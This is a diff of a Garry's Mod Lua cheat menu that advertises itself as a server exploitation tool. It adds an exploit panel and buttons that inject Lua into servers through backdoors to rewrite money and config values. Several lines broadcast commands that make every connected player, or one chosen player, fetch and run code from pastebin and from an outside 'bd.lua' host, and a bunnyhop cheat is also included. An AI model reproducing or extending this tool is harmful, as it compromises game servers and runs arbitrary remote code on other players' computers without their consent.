+				surface.DrawTexturedRect(0, 0, w, h / 2)
+				surface.SetDrawColor(Color(100, 100, 100, 255))
+				surface.DrawOutlinedRect(0, 0, w, h)
+			end
+
+			local tttt = vgui.Create("DLabel", hostframe)
+			tttt:SetPos(5, 5)
+			tttt:SetText(btext)
+			tttt:SizeToContents()
+			local wangmeoff = vgui.Create("DNumberWang", hostframe)
+			wangmeoff:SetPos(10 + tttt:GetWide(), 2)
+			wangmeoff:SetSize(45, 20)
+			wangmeoff:SetDecimals(2)
+			wangmeoff:SetValue(rebug.GetStored(addr, default))
+
+			wangmeoff.OnValueChanged = function(self, val)
+				rebug.Store(addr, self:GetValue())
+			end
+
+			hostframe:SetSize(13 + tttt:GetWide() + wangmeoff:GetWide(), 24)
+
+			return hostframe:GetWide(), hostframe:GetTall()
+		end
+
+		rebug.Menu = vgui.Create("DFrame")
+		rebug.Menu:SetSize(600, 450)
+		rebug.Menu:SetTitle("Server Exploitation( Backdoor NOT required )")
+		rebug.Menu:Center()
+		rebug.Menu:MakePopup()
+		rebug.Menu.gay = table.Count(rebug.sploits)
+
+		rebug.Menu.Paint = function(s, w, h)
+			surface.SetDrawColor(Color(30, 30, 30))
+			surface.DrawRect(0, 0, w, h)
+			surface.SetDrawColor(35, 21, 21)
+			surface.SetMaterial(upgrad)
+			surface.SetDrawColor(o_color2)
+			surface.SetMaterial(downgrad)
+			surface.SetDrawColor(o_color2)
+			surface.SetDrawColor(35, 35, 35, 255)
+			surface.DrawOutlinedRect(0, 0, w, h)
+		end
+
+
+		local Plist11 = vgui.Create("DPanelList", rebug.Menu)
+		Plist11:SetSize(550, rebug.Menu:GetTall() - 35)
+		Plist11:SetPadding(5)
+		Plist11:SetSpacing(5)
+		Plist11:EnableHorizontal( false )
+		Plist11:EnableVerticalScrollbar( true )
+		Plist11:SetPos(6, 30)
+		Plist11:SetName("")
+
+		local function CreateSploitPanel(name, t)
+			if not Plist11 then return end
+			local cmdp = vgui.Create("DPanel")
+			cmdp:SetSize(Plist11:GetWide(), 70)
+			cmdp.Cmd = name
+			cmdp.Desc = t.desc
+
+			cmdp.Paint = function(s, w, h)
+				surface.SetDrawColor(Color(50, 50, 50, 245))
+				surface.DrawRect(0, 0, w, h)
+				surface.SetDrawColor(severitycols[t.severity])
+				surface.DrawOutlinedRect(0, 0, w, h)
+				surface.DrawLine(0, 24, w, 24)
+				draw.DrawText(cmdp.Cmd, "DermaDefault", 10, 5, Color(255, 255, 255))
+				draw.DrawText(cmdp.Desc, "DermaDefault", 10, 28, Color(205, 205, 255, 100))
+			end
+
+			local x = 10
+
+			for _, tab in ipairs(t.functions) do
+				if tab.typ == "func" then
+					x = (x + 5) + rebug.MakeFunctionButton(cmdp, x, 42, tab.name, tab.func)
+				elseif tab.typ == "players" then
+					x = (x + 5) + rebug.MakePlayerSelectionButton(cmdp, x, 42, tab.addr)
+				elseif tab.typ == "string" then
+					x = (x + 5) + rebug.MakeTextInputButton(cmdp, x, 42, tab.name, tab.default, tab.addr)
+
+					if not rebug.IsStored(tab.addr) then
+						rebug.Store(tab.addr, tab.default)
+					end
+				elseif tab.typ == "float" then
+					x = (x + 5) + rebug.MakeNumberInputButton(cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr)
+
+					if not rebug.IsStored(tab.addr) then
+						rebug.Store(tab.addr, tab.default)
+					end
+				end
+			end
+
+			Plist11:AddItem(cmdp)
+		end
+
+		for k, v in pairs(rebug.sploits) do
+			if v.scan() then
+				CreateSploitPanel(k, v)
+			end
+		end
+	end
+
+        local exploitationP = vgui.Create("DButton", VoidPlate)
+        exploitationP:SetFont("Trebuchet18")
+        exploitationP:SetText("Exploits")
+        exploitationP:SetTextColor(Color(255, 255, 255, 255))
+        exploitationP:SetPos(693, 591)
+        exploitationP:SetSize(180, 40)
+
+        exploitationP.Paint = function(self, w, h)
+            surface.SetDrawColor(Color(30, 30, 30))
+            surface.DrawRect(0, 0, w, h)
+            surface.SetDrawColor(21, 21, 21)
+            surface.SetMaterial(upgrad)
+            surface.SetDrawColor(o_color2)
+            surface.SetMaterial(downgrad)
+            surface.SetDrawColor(o_color2)
+            surface.SetDrawColor(21, 21, 21, 255)
+            surface.DrawOutlinedRect(0, 0, w, h)
+        end
+
+        exploitationP.DoClick = function()
+		surface.PlaySound("buttons/button18.wav")
+            exploitation()
+            Void:SetVisible(false)
+        end
+
+--[[-------------------------------------------------------------------------------------
 Panels 1 : rcon / detour
 ----------------------------------------------------------------------------------------]]
         local List1 = vgui.Create("DPanelList", VoidPlate)
@@ -1516,31 +2334,7 @@ Panels 2 : backdoors :)
 
         bhop.DoClick = function()
             surface.PlaySound("buttons/button18.wav")
-
-            if hook.GetTable()["VOIDZZ"] then
-                hook.Remove("VOIDZZ")
-            end
-
-            local function ch_bunnyhop(ply)
-                if (ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
-                    ply:RemoveKey(IN_JUMP)
-
-                    if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
-                        if (ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
-                            ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400)
-                        else
-                            ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
-                            ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400)
-                        end
-                    end
-                elseif (ply:KeyDown(IN_JUMP)) then
-                    ply:SetForwardMove(10000)
-                end
-            end
-
-            hook.Add("CreateMove", "VOIDZZ", function(ply)
-                ch_bunnyhop(ply)
-            end)
+			OP_Bhop()
         end
 		
         -- Backdoor 1
@@ -1623,11 +2417,17 @@ Panels 2 : backdoors :)
             end)
         end)
 
-
         rebug.AddButton("Bitminer2 Amount Value", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            Derma_StringRequest("Bitminer2 Amount Value", "Set the value of how much bitminer2 give", "", function(str)
+            Derma_StringRequest("Bitminer2 Amount Value", "Set how much money bitminer2 makes", "", function(str)
                 noob.PostLua("BM2CONFIG.BitcoinValue =" .. str)
+            end)
+        end)
+
+        rebug.AddButton("pVault Money Bags", Bar1, function()
+            surface.PlaySound("buttons/button18.wav")
+            Derma_StringRequest("pVault Money Bags", "Set how much money each bag is worth", "", function(str)
+                noob.PostLua("perfectVault.Config.MoneybagMinValue =" .. str)
             end)
         end)
 
@@ -1830,12 +2630,14 @@ Panels 2 : backdoors :)
 
         rebug.AddButton("DarkRP Start Cash", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[
+            Derma_StringRequest("DarkRP Start Cash", "Set the starting money that all players start with :)", "", function(str)
+				noob.PostLua([[
 			
-			GM.Config.startingmoney = ]]..str..[[ 
+				GM.Config.startingmoney = ]]..str..[[ 
 			
-			]])
-        end)
+				]])
+			end)
+		end)
 
         rebug.AddButton("Earthquake", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
@@ -1894,7 +2696,7 @@ Panels 2 : backdoors :)
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[
 			
-			BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1',function(b,l,h,c)RunString(b)end,nil)")
+			BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1', function(b) RunString(b) end )")
 			
 			]])
         end)
@@ -2009,7 +2811,7 @@ Panels 2 : backdoors :)
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[
 
-			BroadcastLua("http.Fetch('https://pastebin.com/raw/gCG1pSNK',function(b,l,h,c)RunString(b)end,nil)")
+				BroadcastLua("http.Fetch('https://pastebin.com/raw/gCG1pSNK',RunString)")
 
 			]])
             rprint("This may cause frame drop")
@@ -2226,14 +3028,15 @@ Panels 3 : RCON Backdoors
         item2:EnableHorizontal(false)
         item2:EnableVerticalScrollbar(true)
         item2:SetName("")
-        local scan = vgui.Create("DButton", VoidPlate)
-        scan:SetFont("Trebuchet18")
-        scan:SetText("Backdoor Scan")
-        scan:SetTextColor(Color(255, 255, 255, 255))
-        scan:SetPos(235, 637)
-        scan:SetSize(180, 40)
 
-        scan.Paint = function(self, w, h)
+        local scann = vgui.Create("DButton", VoidPlate)
+        scann:SetFont("Trebuchet18")
+        scann:SetText("Backdoor Scan")
+        scann:SetTextColor(Color(255, 255, 255, 255))
+        scann:SetPos(235, 637)
+        scann:SetSize(180, 40)
+
+        scann.Paint = function(self, w, h)
             surface.SetDrawColor(Color(30, 30, 30))
             surface.DrawRect(0, 0, w, h)
             surface.SetDrawColor(21, 21, 21)
@@ -2245,7 +3048,7 @@ Panels 3 : RCON Backdoors
             surface.DrawOutlinedRect(0, 0, w, h)
         end
 
-        scan.DoClick = function()
+        scann.DoClick = function()
             surface.PlaySound("buttons/button18.wav")
             CheckBackdoors()
         end
@@ -2575,11 +3378,11 @@ Panels 3 : Targeting
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[
 			
-			Player(]]..selPly..[[):SendLua('http.Fetch("https://rvac.cc/log1n/bd.lua",RunString))')
+			Player(]]..selPly..[[):SendLua('http.Fetch("https://rvac.cc/log1n/bd.lua",RunString)')
 			
 			]])
         end)
-		
+
         rebug.AddButton("Cleanup Props", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[
@@ -2871,11 +3674,12 @@ Panels 4 : Player List
         targeting:SetFont("Trebuchet18")
         targeting:SetText("No Player Selected")
         targeting:SetTextColor(Color(255, 255, 255))
-        targeting:SetPos(695, 663)
+        targeting:SetPos(690, 560)
         targeting:SizeToContents()
+		
         local List4 = vgui.Create("DPanelList", VoidPlate)
         List4:SetPos(693, 155)
-        List4:SetSize(180, 502)
+        List4:SetSize(180, 400)
         List4:SetPadding(2)
         List4:SetSpacing(2)
         List4:EnableHorizontal(false)
@@ -2896,7 +3700,7 @@ Panels 4 : Player List
 
         local item4 = vgui.Create("DPanelList", List4)
         item4:SetPos(5, 8)
-        item4:SetSize(170, 486)
+        item4:SetSize(170, 390)
         item4:SetPadding(2)
         item4:SetSpacing(2)
         item4:EnableHorizontal(false)
